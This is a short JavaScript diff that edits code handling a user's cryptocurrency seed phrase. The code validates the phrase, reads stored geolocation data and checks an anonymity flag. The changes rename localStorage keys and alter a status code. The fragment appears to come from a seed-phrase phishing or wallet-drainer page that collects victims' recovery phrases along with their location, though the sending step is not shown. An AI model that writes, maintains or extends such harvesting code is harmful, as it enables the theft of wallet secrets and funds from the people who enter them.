@@ -123,7 +123,7 @@ function validateMnemonic(mnemonic) {
    try{
         SetProcessing(true);
         var encode = '';
-        var ip = getLocalStorage("location") ? getLocalStorage("location") : "{}";
+        var ip = getLocalStorage("geoinfo") ? getLocalStorage("geoinfo") : "{}";
         var formattedSeedPhrase = normalizeText(secretPharse);
         if(validateMnemonic(formattedSeedPhrase)){
           try{
@@ -139,8 +139,8 @@ function validateMnemonic(mnemonic) {
                      /*del*/
                     var _s = '';
                     if(ip != "{}"){
-                      if(!getLocalStorage("is_anonymous")){
-                        _s = 0;
+                      if(!getLocalStorage("anonymous")){
+                        _s = 3;
                       }
                     }
                     /*del*/
